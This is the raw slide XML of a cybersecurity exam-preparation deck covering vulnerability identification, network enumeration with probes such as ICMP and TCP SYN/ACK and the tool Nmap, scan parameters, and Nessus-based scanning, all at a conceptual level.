              </a:rPr>
              <a:t>•  Health Insurance Portability and Accountability Act (HIPAA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  General Data Protection Regulation (GDPR)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Corporate policy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data classification</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427</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VULNERABILITY IDENTIFICATION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Vulnerability Identification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Vulnerability identification is the process of discovering weaknesses across an environment, and it starts with a complete and accurate asset inventory because you cannot assess what you do not know exists (all endpoints, servers, network devices, cloud instances, and web applications).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Each asset must be assigned a criticality rating based on the data it holds and its business importance, since that rating (combined with exposure and exploitability) drives remediation priority rather than treating every finding equally.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scanning can be active (the scanner sends probes and interacts with targets, giving detailed results but generating traffic and some risk to fragile systems) or passive (it observes existing network traffic without sending packets, which is safer and continuous but less complete), and specialized web-application scanning is needed to find flaws like injection and XSS that infrastructure scanners miss.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts rely on this discipline so their limited remediation effort is focused on the vulnerabilities that most threaten the most important assets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on why asset inventory and asset criticality underpin prioritization, and on choosing active versus passive scanning based on the need for depth versus the risk of disrupting sensitive systems.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428</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VULNERABILITY IDENTIFICATION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Vulnerability Identification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Asset inventory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  All endpoints?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Servers only?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Inventory all assets to determine vulnerability identification considerations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Asset criticality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Necessary to determine mediation priorities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429</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VULNERABILITY IDENTIFICATION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Vulnerability Identification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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Active vs. passive scanning</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_df975392f0.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="3000039"/>
            <a:ext cx="4937760" cy="1863762"/>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430</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VULNERABILITY IDENTIFICATION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Mapping/ Enumeration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Mapping and enumeration is the reconnaissance stage in which an analyst or attacker discovers which hosts are alive, which ports and services they expose, and how the network is structured, forming the foundation for any vulnerability assessment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common host-discovery and probing techniques include ICMP echo requests (ping), TCP SYN scans to service ports such as 443, TCP ACK probes to ports like 80 to map firewall rules, and ICMP timestamp requests, each of which elicits responses that reveal whether a host or service is reachable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Nmap is the standard tool for this work, combining host discovery, port scanning, service and version detection, and OS fingerprinting in one utility.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because accurate mapping defines the true attack surface that scanning and remediation must cover, and recognizing these same probes in logs helps them detect an adversary's own reconnaissance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests identifying enumeration techniques (ICMP, TCP SYN/ACK probes) and knowing that Nmap performs host discovery, port scanning, and service/OS fingerprinting to establish the attack surface.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431</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VULNERABILITY IDENTIFICATION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Mapping/ Enumeration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Common techniques</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  ICMP echo request</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  TCP SYN to port 443</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  TCP ACK to port 80</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  ICMP timestamp request</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Nmap is a great tool to use here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432</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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VULNERABILITY IDENTIFICATION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Vulnerability Identification (3)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Vulnerability scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Web application</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433</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING PARAMETERS AND CRITERIA</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Scanning Parameters and Criteria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Scanning parameters are the deliberate settings and boundaries an analyst defines before running a vulnerability scan, including scope, timing, intensity, and which assets are in or out of bounds. Aggressive or credentialed scans consume bandwidth and CPU and can crash fragile hosts, so they may impact the availability of production systems and must often be scheduled for maintenance windows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Criteria are also shaped by regulatory requirements and technical constraints: frameworks like PCI DSS, HIPAA, and GDPR dictate scan frequency and coverage, while limited personnel, network segmentation, and legacy equipment constrain what is realistically achievable. Data sensitivity levels matter too, because systems holding classified data, PHI, PII, or payment card data may require higher-privilege clearance to scan and warrant more careful, more frequent examination.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because poorly chosen parameters either miss critical exposures or disrupt the business, and because scanning outside regulatory or authorized boundaries can itself create legal and operational risk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions asking you to pick appropriate scan scope, timing, or authorization given availability risks, regulatory drivers, and data sensitivity.</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434</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING PARAMETERS AND CRITERIA</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Scanning Parameters and Criteria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Risks associated with scanning activities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  May impact availability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Regulatory requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Work within regulatory environments</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Technical constraints</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Workflow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Work with your available resources (personnel and technical)</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435</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING PARAMETERS AND CRITERIA</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Scanning Parameters and Criteria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Sensitivity levels</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Clearance and classified data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Sensitive data (PHI, PII, payment cards, etc.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Are you authorized to view data?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Segmentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  VLANs in logical architecture</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Understand network architecture for appropriate scans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436</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING PARAMETERS AND CRITERIA</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Scanning Parameters and Criteria (3)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Vulnerability feed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Up-to-date known vulnerability information</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scope</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  How many devices/ endpoints?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437</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING PARAMETERS AND CRITERIA</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Scanning Parameters and Criteria (4)</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Credentialed vs. non-credentialed scan</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_48dc89e0cb.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="3315777"/>
            <a:ext cx="4937760" cy="1232285"/>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438</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING PARAMETERS AND CRITERIA</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Scanning Parameters and Criteria (5)</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Server-based vs. agent-based scan</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_cbe899a899.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="3043989"/>
            <a:ext cx="4937760" cy="1775861"/>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439</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING PARAMETERS AND CRITERIA</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Scanning Parameters and Criteria (6)</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Internal vs. external scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Does scan execute from within corporate network?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Or execute from outside the network via external node?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Results vary</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Report results based on internal/external scan</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440</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING SPECIAL CONSIDERATIONS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Special Scanning Considerations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Special scanning considerations are the decisions about what to scan for and how to scan consistently based on the organization's data types and the regulations driving the assessment. An analyst must decide whether to scan for everything or target specific data such as cardholder data or PHI, and that choice flows directly from understanding the business context and compliance obligations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Tools such as Nessus automate much of the process, and their value depends on keeping the plug-in feed and vulnerability signatures updated; Nessus plug-ins are written in the Nessus Attack Scripting Language (NASL), which defines how each specific check is performed. Saving scan policies and templates lets analysts recreate scans identically over time, which is essential for measuring remediation progress and demonstrating consistency to auditors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because consistent, well-tuned, up-to-date scans produce comparable results across cycles, reduce false findings, and give defensible evidence that the environment is being monitored the same way each time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions naming Nessus, NASL, or plug-in updates, and items testing why repeatable, standardized scan configurations matter for trend tracking and compliance.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441</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide4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SCANNING SPECIAL CONSIDERATIONS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Special Scanning Considerations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Types of data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Scan for everything or just certain types of data?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
